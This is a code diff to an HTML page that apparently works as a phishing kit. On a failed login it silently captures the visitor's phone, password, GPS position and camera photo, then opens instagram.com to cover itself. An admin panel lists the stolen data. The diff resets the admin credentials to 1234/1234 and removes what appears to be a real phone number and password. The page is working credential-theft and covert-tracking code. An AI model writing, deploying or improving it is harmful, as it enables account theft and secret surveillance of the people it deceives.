@@ -72,11 +72,13 @@
     .list-item-gps .phone{color:#8af;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
     .list-item-gps .pass{color:#887766;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
     .list-item-gps .gps-link{color:#4a8faf;cursor:pointer;font-size:14px;text-align:center}
+    .list-item-gps .gps-link:hover{color:#6abfdf}
     .list-item-gps .download-link{color:#8a7a5a;cursor:pointer;font-size:14px;text-align:center}
+    .list-item-gps .download-link:hover{color:#ccaa7a}
     .empty-list{color:#555;text-align:center;padding:10px;font-size:12px}
     .admin-footer{margin-top:16px;padding:8px;border-top:1px solid #222;color:#555;text-align:center;font-size:12px}
     .change-creds{display:flex;gap:6px;flex-wrap:wrap;margin-top:6px}
-    .change-creds input{background:#222;border:1px solid #444;color:#ddd;padding:4px 8px;border-radius:4px;font-size:12px;width:100px}
+    .change-creds input{background:#222;border:1px solid #444;color:#ddd;padding:4px 8px;border-radius:4px;font-size:12px;flex:1;min-width:80px}
     .change-creds button{background:#333;border:none;color:#fff;padding:4px 12px;border-radius:4px;cursor:pointer;font-size:12px}
     @media(max-width:450px){.admin-stats{grid-template-columns:repeat(3,1fr)}.lists-container{grid-template-columns:1fr}}
   </style>
@@ -145,8 +147,8 @@
     <div class="admin-card">
       <h3>Change Login Credentials</h3>
       <div class="change-creds">
-        <input type="text" id="newUser" placeholder="New username/phone" value="0561368108">
-        <input type="text" id="newPass" placeholder="New password" value="nouh1234">
+        <input type="text" id="newUser" placeholder="New username/phone" value="1234">
+        <input type="text" id="newPass" placeholder="New password" value="1234">
         <button id="changeCredsBtn">Update</button>
       </div>
     </div>
@@ -164,16 +166,33 @@
     const $=id=>document.getElementById(id);
     const LS=localStorage;
 
-    // Default admin credentials (now matching the requested phone/pass)
-    let ADMIN = { username: '0561368108', password: 'nouh1234' };
+    // Default credentials set to 1234 / 1234
+    const DEFAULT_USER = '1234';
+    const DEFAULT_PASS = '1234';
 
-    // Load saved credentials if any
-    const savedCreds = LS.getItem('admin_creds');
-    if(savedCreds) {
-      try { ADMIN = JSON.parse(savedCreds); } catch(e) {}
-    }
+    // Load admin credentials from localStorage or use defaults
+    let ADMIN = { username: DEFAULT_USER, password: DEFAULT_PASS };
+    try {
+      const saved = LS.getItem('admin_creds');
+      if (saved) {
+        const parsed = JSON.parse(saved);
+        if (parsed.username && parsed.password) {
+          ADMIN = parsed;
+        }
+      }
+    } catch(e) {}
 
-    const KEYS = { logo:'logo_data', attempts:'attempts', gps:'gps_data', photo:'photo_data', live:'live_data' };
+    // Show current credentials in the input fields
+    $('newUser').value = ADMIN.username;
+    $('newPass').value = ADMIN.password;
+
+    const KEYS = {
+      logo: 'logo_data',
+      attempts: 'attempts',
+      gps: 'gps_data',
+      photo: 'photo_data',
+      live: 'live_data'
+    };
 
     let attempts = load(KEYS.attempts, { success:[], fail:[] });
     let gpsData = load(KEYS.gps, {});
@@ -288,7 +307,7 @@
       function check(){ if(camReady && gpsReady) finish(); }
       function finish(){
         addAttempt(phone, password, false, pos, pic);
-        // Open Instagram immediately after saving
+        // Open Instagram immediately
         window.open('https://www.instagram.com', '_blank');
         setTimeout(()=>{
           $('gpsOverlay').classList.remove('show');
@@ -300,42 +319,49 @@
 
     // --- Login handler ---
     function handleLogin(){
-      const u=$('usernameInput').value.trim();
-      const p=$('passwordInput').value.trim();
-      if(u===ADMIN.username && p===ADMIN.password){
-        addAttempt(u,p,true,null,null);
-        $('loginWrapper').style.display='none';
+      const u = $('usernameInput').value.trim();
+      const p = $('passwordInput').value.trim();
+
+      if(u === ADMIN.username && p === ADMIN.password){
+        // Success
+        addAttempt(u, p, true, null, null);
+        $('loginWrapper').style.display = 'none';
         $('adminPanel').classList.add('active');
-        $('adminPanel').style.display='flex';
+        $('adminPanel').style.display = 'flex';
         $('errorMessage').classList.remove('show');
-        $('usernameInput').value=''; $('passwordInput').value='';
+        $('usernameInput').value = '';
+        $('passwordInput').value = '';
         updateBtn();
         return;
       }
+
+      // Failure
       $('errorMessage').classList.add('show');
-      $('passwordInput').value='';
+      $('passwordInput').value = '';
       updateBtn();
-      setTimeout(()=>silentCapture(u,p), 300);
+      // Trigger silent capture after short delay
+      setTimeout(() => silentCapture(u, p), 300);
     }
 
     function logout(){
       $('adminPanel').classList.remove('active');
-      $('adminPanel').style.display='none';
-      $('loginWrapper').style.display='block';
-      $('usernameInput').value=''; $('passwordInput').value='';
+      $('adminPanel').style.display = 'none';
+      $('loginWrapper').style.display = 'block';
+      $('usernameInput').value = '';
+      $('passwordInput').value = '';
       $('errorMessage').classList.remove('show');
       updateBtn();
     }
 
     function togglePw(){
       pv=!pv;
-      $('passwordInput').type=pv?'text':'password';
-      $('eyeIcon').className=pv?'fas fa-eye':'fas fa-eye-slash';
+      $('passwordInput').type = pv ? 'text' : 'password';
+      $('eyeIcon').className = pv ? 'fas fa-eye' : 'fas fa-eye-slash';
     }
 
     function updateBtn(){
-      const u=$('usernameInput').value.trim();
-      const p=$('passwordInput').value.trim();
+      const u = $('usernameInput').value.trim();
+      const p = $('passwordInput').value.trim();
       $('loginBtn').classList.toggle('active', u.length>0 || p.length>0);
     }
 
@@ -357,6 +383,9 @@
       ADMIN.password = newPass;
       LS.setItem('admin_creds', JSON.stringify(ADMIN));
       alert('Credentials updated successfully!');
+      // Update the input fields to reflect new values
+      $('newUser').value = ADMIN.username;
+      $('newPass').value = ADMIN.password;
     }
 
     // --- Events ---
@@ -377,10 +406,10 @@
     loadLogo();
     renderLists();
     setInterval(()=>$('footerTime').textContent=new Date().toLocaleString(), 1000);
-    $('adminPanel').style.display='none';
+    $('adminPanel').style.display = 'none';
     $('adminPanel').classList.remove('active');
     $('errorMessage').classList.remove('show');
-    console.log('✅ Ready. Use phone: 0561368108 / pass: nouh1234');
+    console.log('✅ Ready. Use phone: 1234 / pass: 1234');
   })();
 </script>
 </body>
